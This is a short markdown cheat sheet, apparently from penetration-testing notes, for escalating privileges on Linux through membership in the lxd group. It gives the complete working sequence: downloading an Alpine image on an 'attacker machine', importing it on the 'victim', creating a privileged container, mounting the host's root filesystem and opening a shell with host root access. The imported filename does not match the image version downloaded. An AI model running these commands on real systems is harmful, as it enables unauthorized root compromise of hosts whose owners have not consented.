# Check permission
User should be in group `116(lxd)`
```sh
id
```
# Download image
On your attacker machine, download this image and transfer it to our victim
```sh
wget https://images.linuxcontainers.org/images/alpine/3.19/amd64/default/20250918_13:00/
```
# Exploit
```sh
lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine
lxc image list
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root
```
